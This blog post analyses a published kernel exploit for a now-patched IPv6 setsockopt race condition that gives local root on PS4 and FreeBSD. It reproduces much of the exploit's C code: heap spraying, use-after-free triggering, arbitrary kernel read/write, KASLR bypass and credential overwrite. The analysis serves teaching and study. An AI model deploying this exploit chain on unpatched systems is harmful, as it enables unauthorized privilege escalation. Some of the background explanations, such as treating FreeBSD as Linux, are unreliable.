# Hacking PCs is so 2000, let's hack a PS4!
Okay, hacking PCs is not so 2000s but still, for my first blog post here I decided to spice things up and show you guys a (now patched) race vulnerability that can be used for a local privilege escalation attack on the PS4 (and also FreeBSD 9 and 12).
I'm zer0 (Adithya Bhaskar) and in my blog posts I intend to cover real-world exploits and malware. 
Now, I must clarify (though it is obvious) that I did not find this bug. It was found by 'theflow0' and this post is largely an analysis of his exploit code published on [exploit-db](https://www.exploit-db.com/exploits/48644). Furthermore, I had no intention of damaging my PS4 and I could also not find the vulnerable version of FreeBSD (once they patch a version they seldom keep older versions open for download) for my VM and thus this analysis is going to be fully static (as will many of the others, due to the same reason).
Nevertheless there are some interesting techniques at play here, so let's get started.

# Root cause analysis
Let's take a look at the reported summary of the vulnerability

> Due to missing locks in option `IPV6_2292PKTOPTIONS` of `setsockopt` , it is possible to race and free the `struct ip6_pktopts` buffer, while it is being handled by `ip6_setpktopt`. This structure contains pointers (`ip6po_pktinfo`) that can be hijacked to obtain arbitrary kernel R/W primitives. As a consequence, it is easy to have kernel code execution. This vulnerability is reachable from WebKit sandbox and is available in the latest FW, that is 7.02.
### First, what is `sock` and all this?
A `struct sock` is basically a socket object. It is used to "handle" (in layman terms) connections with other servers. The function `setsockopt()` is called to set specific properties/options for a particular socket. The function `ip6_setpktopt` (set packet options) is called by `setsockopt` if the packet is an IPv6 packet. The options to be set are passed through a struct called `struct ip6_pktopts`.
### What is a race condition?
Typically, when you use shared structures, you must acquire a `lock` on the shared structures so that no other threads modify the structure while you are reading/writing from/to it (it's more complicated than this, but that can be left to an OS/microarchitecture course).
In this particular scenario, the race condition is something like this:

 - Let's say we spin up two threads (you can think of them as processes if you don't know what threads are). From thread1 we call `setsockopt` with the option `IPV6_2292PKTOPTIONS` .
 - At the same time, from thread2 we try to free the `struct ip6_pktops` and immediately reallocate another buffer of the same size as this struct.
 - What could end up happening (since recently freed blocks are stored in freelists for caching) is that both our old `struct ip6_pktops` which has been freed but is still being processed and our new buffer (to which we have write permissions) are the same! Can you see where we are going with this use-after-free? 

Let us look at how the exploit does this.
First, it declares some helper functions (you can skip reading this):
```c
int kqueue(void);
int kevent(int kq, const struct kevent *changelist, int nchanges,
           struct kevent *eventlist, int nevents,
           const struct timespec *timeout);

static uint64_t kernel_base;
static uint64_t p_ucred, p_fd;
static uint64_t kevent_addr, pktopts_addr;

static int triggered = 0;
static int kevent_sock, master_sock, overlap_sock, victim_sock;
static int spray_sock[NUM_SPRAY];
static int kq[NUM_KQUEUES];

static void hexDump(const void *data, size_t size) {
  size_t i;
  for(i = 0; i < size; i++) {
    printf("%02hhX%c", ((char *)data)[i], (i + 1) % 16 ? ' ' : '\n');
  }
  printf("\n");
}

static int new_socket(void) {
  return socket(AF_INET6, SOCK_DGRAM, IPPROTO_UDP);
}

static void build_tclass_cmsg(char *buf, int val) {
  struct cmsghdr *cmsg;

  cmsg = (struct cmsghdr *)buf;
  cmsg->cmsg_len = CMSG_LEN(sizeof(int));
  cmsg->cmsg_level = IPPROTO_IPV6;
  cmsg->cmsg_type = IPV6_TCLASS;

  *(int *)CMSG_DATA(cmsg) = val;
}

static int build_rthdr_msg(char *buf, int size) {
  struct ip6_rthdr *rthdr;
  int len;

  len = ((size >> 3) - 1) & ~1;
  size = (len + 1) << 3;

  memset(buf, 0, size);

  rthdr = (struct ip6_rthdr *)buf;
  rthdr->ip6r_nxt = 0;
  rthdr->ip6r_len = len;
  rthdr->ip6r_type = IPV6_RTHDR_TYPE_0;
  rthdr->ip6r_segleft = rthdr->ip6r_len >> 1;

  return size;
}

static int get_rthdr(int s, char *buf, socklen_t len) {
  return getsockopt(s, IPPROTO_IPV6, IPV6_RTHDR, buf, &len);
}

static int set_rthdr(int s, char *buf, socklen_t len) {
  return setsockopt(s, IPPROTO_IPV6, IPV6_RTHDR, buf, len);
}

static int free_rthdr(int s) {
  return set_rthdr(s, NULL, 0);
}

static int get_tclass(int s) {
  int val;
  socklen_t len = sizeof(val);
  getsockopt(s, IPPROTO_IPV6, IPV6_TCLASS, &val, &len);
  return val;
}

static int set_tclass(int s, int val) {
  return setsockopt(s, IPPROTO_IPV6, IPV6_TCLASS, &val, sizeof(val));
}

static int get_pktinfo(int s, char *buf) {
  socklen_t len = sizeof(struct in6_pktinfo);
  return getsockopt(s, IPPROTO_IPV6, IPV6_PKTINFO, buf, &len);
}

static int set_pktinfo(int s, char *buf) {
  return setsockopt(s, IPPROTO_IPV6, IPV6_PKTINFO, buf, sizeof(struct in6_pktinfo));
}

static int set_pktopts(int s, char *buf, socklen_t len) {
  return setsockopt(s, IPPROTO_IPV6, IPV6_2292PKTOPTIONS, buf, len);
}

static int free_pktopts(int s) {
  return set_pktopts(s, NULL, 0);
}
```

Next, it writes a helper function to 'leak' (here the leak is not actually a leak as it is just a simple read of the value returned from `getsockopt()` (i.e. so far it is "legal").
```c
static uint64_t leak_rthdr_ptr(int s) {
  char buf[0x100];
  get_rthdr(s, buf, sizeof(buf));
  return *(uint64_t *)(buf + PKTOPTS_RTHDR_OFFSET);
}

```
### Exploit strategy 
First, the exploit "sprays" the heap with a lot of `struct pktopts`'s so that in thread2 we can free and reallocate many of these structs at once: why must we do this? 
Usually the chance of a race working is very small. Thus if we fill let's say a GB of space with our structs and try to free them all, it is likely that one might end up triggering the race condition. This is much faster than trying with once single `struct pktopt`.
```c
static int spray_pktopts(void) {
  for (int i = 0; i < NUM_SPRAY_RACE; i++)
    set_tclass(spray_sock[i], TCLASS_SPRAY);

  if (get_tclass(master_sock) == TCLASS_SPRAY)
    return 1;	
    // Our race worked! The master (victim) has this class
    // meaning the two point to the same object.

  for (int i = 0; i < NUM_SPRAY_RACE; i++)
    free_pktopts(spray_sock[i]);

  return 0;
}
```
The above function is called by a wrapper function called `trigger_uaf()`:
```c
static int trigger_uaf(void) {
  pthread_t th[2];

  pthread_create(&th[0], NULL, use_thread, NULL);
  pthread_create(&th[1], NULL, free_thread, NULL);

  while (1) {
    if (spray_pktopts())
      break;

#ifndef FBSD12
    usleep(100);
#endif
  }

  triggered = 1;

  pthread_join(th[0], NULL);
  pthread_join(th[1], NULL);

  return find_overlap_sock();
}
```
`find_overlap_sock()` just modifies the victim and checks which of the sprayed sock's have been modified:
```c
static int find_overlap_sock(void) {
  char buf[sizeof(struct in6_pktinfo)];

  write_to_victim(pktopts_addr + PKTOPTS_PKTINFO_OFFSET);

  for (int i = 0; i < NUM_SPRAY; i++) {
    get_pktinfo(spray_sock[i], buf);
    if (*(uint64_t *)(buf + 0x00) != 0)
      return i;
  }

  return -1;
}
```

### So what next?
We still cannot directly write a socket object, so let us free the sprayed socket's and re-allocate them with `struct pktopts` which are basically "packet options" (pktopts) and can be written to read from.
```c
// master_sock and overlap_sock point to the same pktopts
  overlap_sock = spray_sock[idx];
  spray_sock[idx] = new_socket();
  printf("[+] Overlap socket: %x (%x)\n", overlap_sock, idx);

  // Reallocate pktopts
  for (int i = 0; i < NUM_SPRAY; i++) {
    free_pktopts(spray_sock[i]);
    set_tclass(spray_sock[i], 0);
  }

  // Fake master pktopts
  idx = fake_pktopts(0);
  overlap_sock = spray_sock[idx];
  spray_sock[idx] = new_socket(); // use new socket so logic in spraying will be easier
  printf("[+] Overlap socket: %x (%x)\n", overlap_sock, idx);
```
Let's see what we have accomplished: We now have a `
struct in6_pktinfo` (which is basically like a buffer we can write to and read from) and a `struct sock` at the same location. Thus, if we fill a particular offset of the pktinfo with an arbitrary pointer `x`, and then call `getsockopt()` (with appropriate options) on the victim socket, it will dereference the pointer and think that the contents of address `x` are the options and return it! Which means we have **arbitrary kernel read!**. We can read any 8 bytes of any kernel address like this:

```c
static void write_to_victim(uint64_t addr) {
  char buf[sizeof(struct in6_pktinfo)];
  *(uint64_t *)(buf + 0x00) = addr;
  *(uint64_t *)(buf + 0x08) = 0;
  *(uint32_t *)(buf + 0x10) = 0;
  set_pktinfo(master_sock, buf);
}
```
```c
static uint8_t kread8(uint64_t addr) {
  char buf[sizeof(struct in6_pktinfo)];
  write_to_victim(addr);
  get_pktinfo(victim_sock, buf);
  return *(uint8_t *)buf;
}
```
And now, we can turn this quite simply to an arbitrary sized read:
```c
static void kread(void *dst, uint64_t src, size_t len) {
  for (int i = 0; i < len; i++)
    ((uint8_t *)dst)[i] = kread8(src + i);
}
```
### Arbitrary write
We can also use the same primitive for arbitrary kernel write: we can write an address `y` to our pktinfo buffer, and then call `setsockopt()` instead of `getsockopt()` to write to the same address.
```c
static int kwrite(uint64_t addr, void *buf) {
  write_to_victim(addr);
  return set_pktinfo(victim_sock, buf);
}
```
Now that we have both primitives lets get to defeating some kernel defenses.

### Defeating KASLR
**K**ernel **A**ddress **S**pace **L**ayout **R**andomization is a technique to make exploiting such vulnerabilities harder. Every time an executable (or the kernel in this case) loads, it's offset will be randomized. If there were static offsets (like in the pre-2006 linux) it would be easy to guess the address of some key data structures and corrupt them. This is aimed to prevent such things from happening. 
Thankfully, this is not Windows. Windows has a plethora of other defenses which are really hard to overcome like SMAP and SMEP. However in linux its relatively easier to exploit arbitrary write. 
Fortunately for us, the kernel base starts with an ELF header, and every ELF  header must have the `ELF_MAGIC` value set in the beginning, so we only need to scan the memory for `ELF_MAGIC` 
```c
static uint64_t find_kernel_base(uint64_t addr) {
  addr &= ~(PAGE_SIZE - 1);
  while (kread32(addr) != ELF_MAGIC)
    addr -= PAGE_SIZE;
  return addr;
}
```
Next, the process descriptor table is always at a fixed offset from the kernel base. So we  can walk the table until we reach our own process: this will help us leak the addresses to which some critical structures of the kernel have been mapped in our process

```c
static int find_proc_cred_and_fd(pid_t pid) {
  uint64_t proc = kread64(kernel_base + ALLPROC_OFFSET);

  while (proc) {
    if (kread32(proc + PROC_PID_OFFSET) == pid) {
      p_ucred = kread64(proc + PROC_UCRED_OFFSET);
      p_fd = kread64(proc + PROC_FD_OFFSET);
      printf("[+] p_ucred: 0x%lx\n", p_ucred);
      printf("[+] p_fd: 0x%lx\n", p_fd);
      return 0;
    }

    proc = kread64(proc + PROC_LIST_OFFSET);
  }

  return -1;
}
```
Above, `p_fd` contains the pointer to the file descriptor tables (i.e. arbitrary file read may now be orchestrated). But even more interestingly, `p_ucred` is where the credentials of the current user are stored. Now `uid 0` is always root. GUID or GID in linux is the group descriptor and to get access to all resources all we need to do is set uid and guid to 0.
```c
static void escalate_privileges(void) {
  char buf[sizeof(struct in6_pktinfo)];

  *(uint32_t *)(buf + 0x00) = 0; // cr_uid
  *(uint32_t *)(buf + 0x04) = 0; // cr_ruid
  *(uint32_t *)(buf + 0x08) = 0; // cr_svuid
  *(uint32_t *)(buf + 0x0c) = 1; // cr_ngroups
  *(uint32_t *)(buf + 0x10) = 0; // cr_rgid

  kwrite(p_ucred + 4, buf);
}

```
### Cleanup

We can just set the crucial pointers of the exploited `sock`'s to 0 so that the kernel does not by mistake use some wrong value and crash. For the other sock's that we sprayed, we can just `free()` them.
```c
static void cleanup(void) {
  uint64_t master_pktopts, overlap_pktopts, victim_pktopts;

  master_pktopts  = find_socket_pktopts(master_sock);
  overlap_pktopts = find_socket_pktopts(overlap_sock);
  victim_pktopts  = find_socket_pktopts(victim_sock);

  kwrite64(master_pktopts  + PKTOPTS_PKTINFO_OFFSET, 0);
  kwrite64(overlap_pktopts + PKTOPTS_RTHDR_OFFSET, 0);
  kwrite64(victim_pktopts  + PKTOPTS_PKTINFO_OFFSET, 0);
}
```

### Aand..... root!

And thats it! We can now gain r00t access in a PS4 system (well, an _unpatched_ PS4 system):
```c
victim_sock = spray_sock[idx];
  printf("[+] Victim socket: %x (%x)\n", victim_sock, idx);

  printf("[+] Arbitrary R/W achieved.\n");

  knote    = kread64(kevent_addr + kevent_sock * sizeof(uintptr_t));
  kn_fop   = kread64(knote + KNOTE_FOP_OFFSET);
  f_detach = kread64(kn_fop + FILTEROPS_DETACH_OFFSET);

  printf("[+] knote: 0x%lx\n", knote);
  printf("[+] kn_fop: 0x%lx\n", kn_fop);
  printf("[+] f_detach: 0x%lx\n", f_detach);

  printf("[+] Finding kernel base...\n");
  kernel_base = find_kernel_base(f_detach);
  printf("[+] Kernel base: 0x%lx\n", kernel_base);

  printf("[+] Finding process cred and fd...\n");
  find_proc_cred_and_fd(getpid());

  printf("[*] Escalating privileges...\n");
  escalate_privileges();

  printf("[*] Cleaning up...\n");
  cleanup();

  printf("[+] Done.\n");

  return 0;
```
# Interesting Techniques used
- A race condition in the kernel leading to a Use-After-Free bug.
- Building stronger primitives out of weaker ones.
- Spraying the heap with victim objects to speed up hitting the race condition.

# References
- [https://www.exploit-db.com/exploits/48644](https://www.exploit-db.com/exploits/48644)
- [https://hackerone.com/reports/826026](https://hackerone.com/reports/826026)
